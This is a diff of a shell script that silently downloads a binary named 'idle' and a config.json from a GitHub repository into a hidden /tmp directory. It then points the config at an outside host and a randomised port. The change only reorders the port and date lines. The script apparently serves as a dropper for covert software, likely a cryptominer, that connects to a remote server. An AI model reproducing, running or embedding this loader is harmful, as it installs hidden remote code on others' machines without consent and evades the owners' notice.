@@ -5,16 +5,14 @@ host="dyn.dream.avspic.com"
 url="https://github.com/pakoinake/jzoax/raw/refs/heads/main"
 work=`ls -t1 /tmp/.*/config.json 2>/dev/null |head -n1`
 [ -n "$work" ] && work="${work%/*}" || work=`mktemp -d -t .XXXXXXXXX`
-
-numRnd=`od -An -N2 -tu4 /dev/urandom |grep -o '[0-9]*'`
-portAdd="$((10#$numRnd % 10#10))"
-port="$((10#$port + 10#$portAdd))"
-name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
-
 [ -d "${work}" ] || exit 1
 # trap "rm -rf ${work}" EXIT
 cd "${work}"
 if [ ! -f "./idle" ]; then
+  numRnd=`od -An -N2 -tu4 /dev/urandom |grep -o '[0-9]*'`
+  portAdd="$((10#$numRnd % 10#10))"
+  port="$((10#$port + 10#$portAdd))"
+  name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
   curl -sSLo "idle" "${url}/idle" 2>/dev/null
   [ -f "config.json" ] || curl -sSLo "config.json" "${url}/idle.json" 2>/dev/null
   [ -f "config.json" ] && [ -n "$host" ] && [ -n "$port" ] && sed -i "s/\"url\":.*,/\"url\": \"${host}:${port}\",/g" "config.json"
